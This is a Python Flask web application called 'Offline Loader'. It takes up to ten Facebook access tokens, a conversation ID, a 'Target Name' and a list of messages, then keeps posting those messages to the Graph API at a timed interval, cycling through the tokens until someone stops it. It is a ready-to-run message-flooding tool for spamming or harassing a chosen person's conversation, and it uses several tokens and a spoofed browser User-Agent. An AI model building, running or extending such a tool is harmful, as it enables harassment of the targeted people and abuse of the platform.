import os  # Fixed: small 'i'
from flask import Flask, request, render_template_string, jsonify, redirect, url_for
import requests
from threading import Thread, Event
import time

app = Flask(__name__)

# Headers
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8'
}

stop_events = {}
threads = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break

            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"Success: {access_token[:10]}... : {message}")
                else:
                    print(f"Failed: {access_token[:10]}...")
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        num_tokens = int(request.form.get('numTokens'))
        if num_tokens > 10:
            return "Error: Maximum 10 tokens allowed."

        access_tokens = [request.form.get(f'accessToken{i+1}') for i in range(num_tokens)]
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))
        message_input = request.form.get('multiMessage')
        messages = [line.strip() for line in message_input.splitlines() if line.strip()]

        task_id = mn.strip()
        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return render_template_string('''
        <html><body style="font-family:Arial;text-align:center;padding:50px;">
            <h2>Sending Started!</h2><p>Task ID: {{ task_id }}</p>
            <a href="{{ url_for('send_message') }}">Go Back</a>
        </body></html>''', task_id=task_id)

    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <title>Offline Loader</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    </head>
    <body class="bg-light">
        <div class="container mt-5 p-4 bg-white shadow rounded">
            <h2 class="text-primary text-center">Offline Loader Setup</h2>
            <form method="POST">
                <input type="number" name="numTokens" id="numTokens" class="form-control mb-3" placeholder="Number of Tokens" min="1" max="10" required onchange="genFields()">
                <div id="fields"></div>
                <input type="text" name="threadId" class="form-control mb-3" placeholder="Conversation ID" required>
                <input type="text" name="kidx" class="form-control mb-3" placeholder="Target Name (Task ID)" required>
                <textarea name="multiMessage" class="form-control mb-3" placeholder="Messages (one per line)" required></textarea>
                <input type="number" name="time" class="form-control mb-3" placeholder="Speed (seconds)" required>
                <button type="submit" class="btn btn-primary w-100">Start Loader</button>
            </form>
            <hr>
            <form action="/stop" method="POST">
                <input type="text" name="taskId" class="form-control mb-3" placeholder="Enter Task ID to Stop" required>
                <button type="submit" class="btn btn-danger w-100">Stop Loader</button>
            </form>
        </div>
        <script>
            function genFields() {
                var n = document.getElementById('numTokens').value;
                var d = document.getElementById('fields'); d.innerHTML = '';
                for(var i=1; i<=n; i++) {
                    d.innerHTML += '<input type="text" name="accessToken'+i+'" class="form-control mb-2" placeholder="Token '+i+'" required>';
                }
            }
        </script>
    </body>
    </html>
    ''')

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        stop_events.pop(task_id)
        return f"Stopped Task: {task_id}. <a href='/'>Go Back</a>"
    return "Task ID not found."

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 20606))
    app.run(host='0.0.0.0', port=port)
